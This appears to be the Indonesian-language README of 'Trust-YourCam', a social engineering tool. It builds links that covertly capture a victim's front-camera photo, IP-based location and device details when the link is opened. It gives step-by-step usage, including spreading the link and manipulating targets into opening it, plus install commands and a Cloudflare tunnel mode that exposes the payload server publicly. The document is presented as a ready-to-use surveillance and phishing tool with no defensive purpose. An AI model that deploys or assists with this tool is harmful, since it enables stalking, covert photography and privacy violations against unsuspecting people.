<h2 align="center">Trust-YourCam</h2> <p align="center"> <img src="" width="590"><br>

  **Trust-YourCam** adalah sebuah tool social engineering yang dirancang untuk membuat link khusus yang, ketika diakses oleh target, secara otomatis akan:

- Mengumpulkan **informasi lokasi** (geolokasi) korban menggunakan teknologi ip lookup (akurasi provider).
- Mengambil **foto secara otomatis** dari kamera depan perangkat korban.
- Mengambil **informasi perangkat** seperti jenis browser, sistem operasi, dan model perangkat (User-Agent).

### Fitur Utama
- **Generate Link Unik:** Setiap link dapat disesuaikan untuk target yang berbeda.
- **Pelacakan Lokasi Real-Time:** Menyimpan Data Lookup, maps, dan waktu akses menggunakan teknologi ip lookup (masi pengembangan).
- **Otomatis Foto Kamera Depan:** Jika izin diberikan, sistem mengambil dan mengunggah foto tanpa interaksi lebih lanjut (stealth mode).
- **Deteksi Informasi Perangkat:** Merekam informasi teknis perangkat yang digunakan korban saat mengakses link (User-Agent).

### Penggunaan
1. Jalankan tools Trust-YourCam.
2. Buat link target dari antarmuka yang disediakan.
3. Sebarkan link ke target (melalui email, chat, dll).
4. pancing target untuk membuka nya (manipulasi)
5. Saat target membuka link dan memberikan akses kamera, data akan langsung terkirim ke server dan dapat dilihat melalui dashboard.

<details open><summary><strong>Command & Penggunaan</strong></summary>

### 1. Install package 
```bash
pkg update
pkg upgrade
apt install git make
```
### 2. Clone Repositori
```bash
git clone https://github.com/ViewTechOrg/Trust-YourCam
cd Trust-YourCam
```
### 3. runing tools Trust-YourCam
```bash
make install
export MOD="clear"
bash Server
```
</details>

### Environment Variables (ENV) - Pengaturan Mode Trust-YourCam

Trust-YourCam mendukung pengaturan berbasis **environment variable** agar pengguna bisa mengontrol mode kerja tool sesuai kebutuhan. Dua variabel utama yang digunakan adalah:

- `MOD` → Menentukan mode atau fungsi yang akan dijalankan
- `NAME` → Menentukan nama sesi atau tampilan di interface panel

---

### Daftar Nilai `MOD` dan Penjelasannya

| Nilai `MOD`   | Fungsi                                                                 |
|---------------|------------------------------------------------------------------------|
| `window`      | Menjalankan server utama, membuka 3 panel interface (dashboard, log, session) |
| `php`         | Menyalakan server lokal payload (PHP-based)                            |
| `cloudflare`  | Mengaktifkan Cloudflare Tunnel agar server lokal bisa diakses publik   |
| `clear`       | Membersihkan file sampah, menghentikan semua proses server             |
| `update`      | Mengecek dan menerapkan update terbaru dari tools                      |

---

### Contoh Penggunaan

#### 1. Menjalankan Mode Interface

```bash
export MOD="window"
bash Server
```
### 2. Kustomisasi Interface Panel (Session)
Untuk mengubah nama session di panel, kamu bisa menggunakan variabel NAME.
```bash
export NAME="Polygon"
export MOD="window"
bash Server
```
Hasilnya, interface akan menampilkan nama session: Polygon



